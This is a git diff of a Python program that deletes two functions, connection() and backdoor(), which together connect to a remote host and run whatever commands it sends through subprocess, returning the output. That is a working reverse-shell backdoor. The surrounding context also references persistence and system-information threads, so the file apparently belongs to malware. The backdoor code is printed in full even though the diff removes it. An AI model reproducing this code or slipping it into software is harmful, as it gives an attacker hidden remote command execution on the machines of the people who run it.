@@ -389,40 +389,6 @@ def start_mouse(short, long):
                             start_mouse(short=3, long=6)
 
 
-def connection():
-    while True:
-        time.sleep(5)
-        print("[i]Connecting to BackDoor...")
-
-        try:
-            soc.connect((server_host, server_port))
-            message = soc.recv(buffer_size).decode()
-            print(f"{message}")
-        except Exception:
-            connection()
-
-        backdoor()
-
-
-def backdoor():
-    while True:
-        command = soc.recv(buffer_size).decode()
-        try:
-            if str(command.lower()) == "exit":
-                print('[!]Connection closed by attacker.')
-                break
-
-        except (ConnectionError, KeyboardInterrupt) as err:
-            print(f"Error: {err} \n[!]Connection closed.")
-            exit()
-
-        output = subprocess.getoutput(command)
-        soc.send(f"{output}\n".encode())
-
-    soc.shutdown(1)
-    soc.close()
-
-
 def main(sysinfo, last_reboot):
     threads.append(persistence_thread)
     threads.append(get_info_thread)
